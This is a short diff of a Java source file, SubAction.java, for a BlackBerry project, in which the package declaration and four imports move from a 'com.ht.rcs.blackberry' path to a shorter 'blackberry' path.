@@ -5,12 +5,12 @@
  * File         : SubAction.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.action;
+package blackberry.action;
 
-import com.ht.rcs.blackberry.Status;
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.Status;
+import blackberry.event.Event;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public abstract class SubAction {
 	//#debug
